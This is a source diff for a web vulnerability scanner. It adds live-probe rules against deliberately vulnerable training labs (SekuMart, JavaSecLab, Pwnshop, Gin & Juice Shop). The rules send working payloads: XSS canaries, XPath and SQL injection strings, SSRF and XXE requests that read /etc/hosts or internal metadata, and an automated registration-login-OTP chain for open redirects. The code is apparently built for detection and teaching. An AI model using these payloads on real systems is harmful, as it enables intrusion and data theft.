@@ -14980,6 +14980,97 @@ const sekumartSearchSqliRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+async function probeSekumartSearchReflectedXss(
+  ctx: RuleContext
+): Promise<RuleResult | null> {
+  const canary = `thugirXSS${Date.now().toString(36)}`;
+  const payload = `<b>${canary}</b>`;
+  const probeUrl = new URL("/search.php", ctx.origin);
+  probeUrl.searchParams.set("q", payload);
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192, timeoutMs: 12000 });
+  if (doc.status < 200 || doc.status >= 500) return null;
+  const reflected =
+    doc.body.includes(`<b>${canary}</b>`) ||
+    doc.body.includes(`<b><b>${canary}</b></b>`);
+  if (!reflected) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl.toString(),
+      canary,
+      snippet: doc.body.match(/You searched for:[\s\S]{0,80}/i)?.[0]?.slice(0, 80) ?? doc.body.slice(0, 200).trim(),
+      note: "SekuMart GET /search.php?q= reflects search term inside <b> without HTML encoding — reflected XSS training oracle"
+    }
+  };
+}
+
+const sekumartSearchXssLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  return (await probeSekumartSearchReflectedXss(ctx)) ?? NEGATIVE;
+};
+
+const sekumartSearchXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/search\.php/i.test(pageUrl)) return NEGATIVE;
+  const result = await sekumartSearchXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "SekuMart /search.php route scan — GET ?q= reflects HTML markup unescaped in search results — reflected XSS training oracle"
+    }
+  };
+};
+
+async function probeSekumartDirectoryXPath(
+  ctx: RuleContext
+): Promise<RuleResult | null> {
+  const probeUrl = new URL("/directory.php", ctx.origin);
+  probeUrl.searchParams.set("q", "' or '1'='1");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 12000 });
+  if (doc.status < 200 || doc.status >= 500) return null;
+  if (!/svc-directory/i.test(doc.body)) return null;
+  const flagMatch = doc.body.match(/FLAG\{[^}]+\}/i);
+  if (!flagMatch) return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      flag: flagMatch[0],
+      snippet: doc.body.match(/svc-directory[\s\S]{0,120}/i)?.[0]?.slice(0, 120) ?? flagMatch[0],
+      note: "SekuMart GET /directory.php?q=' or '1'='1 concatenates into XPath expression and dumps hidden svc-directory flag — XPath injection sqlmap --xpath training oracle"
+    }
+  };
+}
+
+const sekumartDirectoryXPathLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  return (await probeSekumartDirectoryXPath(ctx)) ?? NEGATIVE;
+};
+
+const sekumartDirectoryXPathRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/directory\.php/i.test(pageUrl)) return NEGATIVE;
+  const result = await sekumartDirectoryXPathLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "SekuMart /directory.php route scan — GET ?q=' or '1'='1 triggers XPath injection dumping svc-directory FLAG — sqlmap --xpath training oracle"
+    }
+  };
+};
+
 const sekumartOpenapiSqliLiveOracle: Rule = async (ctx) => {
   if (!isSekumartHost(ctx)) return NEGATIVE;
   const specUrl = new URL("/openapi.json", ctx.origin).toString();
@@ -23878,6 +23969,10 @@ JavaSecLab whgojp/JavaSecLab comprehensive Java vulnerability platform
 GET /xss/reflect/vul1?payload= — JSON-return reflected XSS (GET/POST)
 GET /xss/reflect/vul2?payload= — String direct output reflected XSS
 GET /xss/reflect/vul3?type=html&payload= — text/html reflected XSS
+GET /ssrf/vul?url=file:///etc/hosts — local file read via URLConnection SSRF
+GET /ssrf/vul?url=http://127.0.0.1/ssrf/internal/metadata — internal metadata SSRF
+GET /sqli/jdbc/vul1?type=select&id=1 OR 1=1 — native JDBC string concatenation SQLi
+GET /xxe/vul1?payload= — XMLReader external entity file read / internal SSRF
 `;
 
 const JAVASECLAB_XSS_REFLECTION_PROBE = "thugir-javaseclab-xss-reflect-probe";
@@ -23951,6 +24046,158 @@ const javaSecLabDruidBasicJsonRouteLiveOracle: Rule = async (ctx) => {
     };
   }
   return NEGATIVE;
+};
+
+const javaSecLabSsrfVulLiveOracle: Rule = async (ctx) => {
+  if (!isJavaSecLabHost(ctx)) return NEGATIVE;
+  const probes = [
+    {
+      url: new URL("/ssrf/vul?url=file:///etc/hosts", ctx.origin).toString(),
+      marker: /localhost|127\.0\.0\.1|hosts/i
+    },
+    {
+      url: new URL("/ssrf/vul?url=http://127.0.0.1/ssrf/internal/metadata", ctx.origin).toString(),
+      marker: /instance-id|metadata|token|role/i
+    }
+  ];
+  for (const probe of probes) {
+    const doc = await ctx.probe.get(probe.url, { maxBytes: 16384, timeoutMs: 15000 });
+    if (doc.status >= 200 && doc.status < 500 && probe.marker.test(doc.body)) {
+      return {
+        fired: true,
+        confidence: 0.92,
+        evidence: {
+          probeUrl: probe.url,
+          snippet: doc.body.slice(0, 200).trim(),
+          note: "JavaSecLab GET /ssrf/vul?url= fetches attacker-controlled URLs server-side — SSRF training oracle (file:// or internal metadata)"
+        }
+      };
+    }
+  }
+  return NEGATIVE;
+};
+
+const javaSecLabSsrfVulRouteLiveOracle: Rule = async (ctx) => {
+  if (!isJavaSecLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/ssrf\/vul\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await javaSecLabSsrfVulLiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: { ...live.evidence, scannedUrl: pageUrl, note: "JavaSecLab /ssrf/vul route scan — GET ?url= triggers server-side fetch to file:// or internal metadata — route-specific SSRF training oracle" }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${JAVA_SECLAB_WIKI_FALLBACK}`;
+  if (!/\/ssrf\/vul\?url=|file:\/\/\/etc\/hosts|internal\/metadata/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.87,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /ssrf/vul?url=file:///etc/hosts — URLConnection SSRF",
+      note: "JavaSecLab /ssrf/vul route scan — SSRF training module documented in wiki (auth-gated public demo)"
+    }
+  };
+};
+
+const javaSecLabJdbcSqliVul1LiveOracle: Rule = async (ctx) => {
+  if (!isJavaSecLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/sqli/jdbc/vul1?type=select&id=1%20OR%201%3D1", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (
+    doc.status >= 200 &&
+    doc.status < 500 &&
+    (/SQL|syntax|mysql|jdbc|ORA-|SQLException/i.test(doc.body) ||
+      (doc.body.match(/<tr\b/gi)?.length ?? 0) > 2)
+  ) {
+    return {
+      fired: true,
+      confidence: 0.92,
+      evidence: {
+        probeUrl,
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "JavaSecLab GET /sqli/jdbc/vul1?type=select&id=1 OR 1=1 — native JDBC string concatenation SQLi training oracle"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+const javaSecLabJdbcSqliVul1RouteLiveOracle: Rule = async (ctx) => {
+  if (!isJavaSecLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/sqli\/jdbc\/vul1\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await javaSecLabJdbcSqliVul1LiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: { ...live.evidence, scannedUrl: pageUrl, note: "JavaSecLab /sqli/jdbc/vul1 route scan — native JDBC concatenation SQLi — route-specific training oracle" }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${JAVA_SECLAB_WIKI_FALLBACK}`;
+  if (!/\/sqli\/jdbc\/vul1|id=1 OR 1=1|原生拼接/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.87,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /sqli/jdbc/vul1?type=select&id=1 OR 1=1 — native JDBC SQLi",
+      note: "JavaSecLab /sqli/jdbc/vul1 route scan — JDBC SQLi training module documented in wiki (auth-gated public demo)"
+    }
+  };
+};
+
+const javaSecLabXxeVul1LiveOracle: Rule = async (ctx) => {
+  if (!isJavaSecLabHost(ctx)) return NEGATIVE;
+  const xxePayload =
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>';
+  const probeUrl = new URL(`/xxe/vul1?payload=${encodeURIComponent(xxePayload)}`, ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (
+    doc.status >= 200 &&
+    doc.status < 500 &&
+    (/localhost|127\.0\.0\.1|hosts|DOCTYPE|ENTITY|XMLReader/i.test(doc.body) ||
+      /instance-id|metadata/i.test(doc.body))
+  ) {
+    return {
+      fired: true,
+      confidence: 0.92,
+      evidence: {
+        probeUrl: probeUrl.slice(0, 180),
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "JavaSecLab GET /xxe/vul1?payload= resolves external entities via XMLReader — XXE file read / SSRF training oracle"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+const javaSecLabXxeVul1RouteLiveOracle: Rule = async (ctx) => {
+  if (!isJavaSecLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/xxe\/vul1\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await javaSecLabXxeVul1LiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: { ...live.evidence, scannedUrl: pageUrl, note: "JavaSecLab /xxe/vul1 route scan — XMLReader external entity file read — route-specific XXE training oracle" }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${JAVA_SECLAB_WIKI_FALLBACK}`;
+  if (!/\/xxe\/vul1|XMLReader|external entity/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.87,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /xxe/vul1?payload= — XMLReader external entity",
+      note: "JavaSecLab /xxe/vul1 route scan — XXE training module documented in wiki (auth-gated public demo)"
+    }
+  };
 };
 
 // --- Pwned Labs cloud security training platform (pwnedlabs.io) -----------------------
@@ -39572,6 +39819,8 @@ const pwnshopMassAssignmentAdminLiveOracle: Rule = async (ctx) => {
 
 const PWNSHOP_REGISTER_REDIRECT_PROBE =
   "https://evil-open-redirect-probe.example/thugir-pwnshop-register-redirect";
+const PWNSHOP_LOGIN_REDIRECT_PROBE =
+  "https://evil-open-redirect-probe.example/thugir-pwnshop-login-redirect";
 
 const pwnshopOpenRedirectRegisterLiveOracle: Rule = async (ctx) => {
   if (!isPwnshopHost(ctx)) return NEGATIVE;
@@ -39596,6 +39845,102 @@ const pwnshopOpenRedirectRegisterLiveOracle: Rule = async (ctx) => {
       location,
       probe: PWNSHOP_REGISTER_REDIRECT_PROBE,
       note: "Pwnshop POST /register with next= reflects attacker URL in 302 Location — open redirect on registration (PWN-017)"
+    }
+  };
+};
+
+async function pwnshopRegisterLoginCookieForRedirectProbe(
+  ctx: RuleContext,
+  nextProbe: string
+): Promise<string | null> {
+  const username = `thugir_or_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const email = `${username}@probe.local`;
+  for (let attempt = 0; attempt < 4; attempt++) {
+    const registerDoc = await ctx.probe.get(new URL("/register", ctx.origin).toString(), {
+      method: "POST",
+      body: `username=${encodeURIComponent(username)}&email=${encodeURIComponent(email)}&password=ThugirTest123!`,
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      maxBytes: 4096,
+      timeoutMs: 15000
+    });
+    if (registerDoc.status === 429 || /rate limit|too many requests/i.test(registerDoc.body)) {
+      await pwnshopSleep(2000 + attempt * 2500);
+      continue;
+    }
+    const registerCookie = pwnshopSessionCookieFromDoc(registerDoc);
+    if (!registerCookie) return null;
+    const loginDoc = await ctx.probe.get(new URL("/login", ctx.origin).toString(), {
+      method: "POST",
+      body: `username=${encodeURIComponent(username)}&password=ThugirTest123!&next=${encodeURIComponent(nextProbe)}`,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Cookie: registerCookie
+      },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    const location = loginDoc.headers["location"] || "";
+    if (![301, 302, 303, 307, 308].includes(loginDoc.status) || !/verify-otp/i.test(location)) {
+      return null;
+    }
+    return pwnshopSessionCookieFromDoc(loginDoc) ?? registerCookie;
+  }
+  return null;
+}
+
+const pwnshopOpenRedirectLoginLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const OTP_MAIL_WAITS_MS = [1500, 2500, 3500, 4500, 5500, 6500, 7500, 8500, 10500, 12500];
+  for (let attempt = 0; attempt < OTP_MAIL_WAITS_MS.length; attempt++) {
+    const cookie = await pwnshopRegisterLoginCookieForRedirectProbe(ctx, PWNSHOP_LOGIN_REDIRECT_PROBE);
+    if (!cookie) continue;
+    await pwnshopSleep(OTP_MAIL_WAITS_MS[attempt]);
+    const inboxToken = await pwnshopMailInboxToken(ctx, cookie);
+    if (!inboxToken) continue;
+    const otp = await pwnshopOtpFromMailInbox(ctx, cookie, inboxToken);
+    if (!otp) continue;
+    const verifyDoc = await ctx.probe.get(new URL("/verify-otp", ctx.origin).toString(), {
+      method: "POST",
+      body: `otp=${otp}`,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Cookie: cookie
+      },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    const location = verifyDoc.headers["location"] || "";
+    if (![301, 302, 303, 307, 308].includes(verifyDoc.status)) continue;
+    if (!resolvesToOpenRedirectProbe(location, ctx.origin)) continue;
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        url: new URL("/login", ctx.origin).toString(),
+        location,
+        probe: PWNSHOP_LOGIN_REDIRECT_PROBE,
+        note: "Pwnshop POST /login with next= stores attacker URL through OTP verification and reflects it in 302 Location — open redirect on login (PWN-017)"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+const pwnshopOpenRedirectLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopOpenRedirectLoginLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /login?next= route scan — POST /login with next= reflects attacker URL in 302 Location after OTP verification (PWN-017)"
     }
   };
 };
@@ -69329,6 +69674,38 @@ const ginAndJuiceLoginRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+function ginAndJuiceExternalNextParamFromUrl(pageUrl: string): string | null {
+  try {
+    const nextParam = new URL(pageUrl).searchParams.get("next");
+    if (!nextParam?.trim()) return null;
+    const parsed = new URL(nextParam, "https://ginandjuice.shop");
+    if (parsed.hostname === "ginandjuice.shop") return null;
+    return nextParam;
+  } catch {
+    return null;
+  }
+}
+
+const ginAndJuiceLoginNextOpenRedirectRouteLiveOracle: Rule = async (ctx) => {
+  if (!isGinAndJuiceHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const nextParam = ginAndJuiceExternalNextParamFromUrl(pageUrl);
+  if (!nextParam) return NEGATIVE;
+  const result = await clientSideOpenRedirectEvidence(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      nextParam,
+      note: "Gin & Juice Shop /login?next= route scan — client bundle documents post-login redirect validation that can be abused via next query parameter (FINDING-020 chain)"
+    }
+  };
+};
+
 const ginAndJuiceRegisterAtobRedirectLiveOracle: Rule = async (ctx) => {
   if (!isGinAndJuiceHost(ctx)) return NEGATIVE;
   const probeUrl = new URL("/register", ctx.origin).toString();
@@ -96809,6 +97186,12 @@ export const RULES: Record<string, Rule> = {
   javaSecLabReflectedXssLiveOracle,
   javaSecLabReflectedXssRouteLiveOracle,
   javaSecLabDruidBasicJsonRouteLiveOracle,
+  javaSecLabSsrfVulLiveOracle,
+  javaSecLabSsrfVulRouteLiveOracle,
+  javaSecLabJdbcSqliVul1LiveOracle,
+  javaSecLabJdbcSqliVul1RouteLiveOracle,
+  javaSecLabXxeVul1LiveOracle,
+  javaSecLabXxeVul1RouteLiveOracle,
   clientSidePwnedlabsEvidence,
   clientSidePwnedlabsGitSecretsEvidence,
   clientSideRedtigerHackitEvidence,
@@ -97072,6 +97455,8 @@ export const RULES: Record<string, Rule> = {
   pwnshopChatPromptInjectionRouteLiveOracle,
   pwnshopMassAssignmentAdminLiveOracle,
   pwnshopOpenRedirectRegisterLiveOracle,
+  pwnshopOpenRedirectLoginLiveOracle,
+  pwnshopOpenRedirectLoginRouteLiveOracle,
   pwnshopVerifyOtpBruteforceLiveOracle,
   pwnshopVerifyOtpBruteforceRouteLiveOracle,
   pwnshopOtpNotInvalidatedLiveOracle,
@@ -98765,6 +99150,7 @@ export const RULES: Record<string, Rule> = {
   ginAndJuiceCatalogCategoryCrlfRouteLiveOracle,
   ginAndJuiceLoginUsernameReflectionLiveOracle,
   ginAndJuiceLoginRouteLiveOracle,
+  ginAndJuiceLoginNextOpenRedirectRouteLiveOracle,
   ginAndJuiceRegisterAtobRedirectLiveOracle,
   ginAndJuiceRegisterRouteLiveOracle,
   ginAndJuiceStockXxeLiveOracle,
@@ -99220,6 +99606,10 @@ export const RULES: Record<string, Rule> = {
   sekumartProductSqliRouteLiveOracle,
   sekumartSearchSqliLiveOracle,
   sekumartSearchSqliRouteLiveOracle,
+  sekumartSearchXssLiveOracle,
+  sekumartSearchXssRouteLiveOracle,
+  sekumartDirectoryXPathLiveOracle,
+  sekumartDirectoryXPathRouteLiveOracle,
   sekumartOpenapiSqliLiveOracle,
   sekumartOpenapiSqliRouteLiveOracle,
   clientSideBreakTheFlaskEvidence,
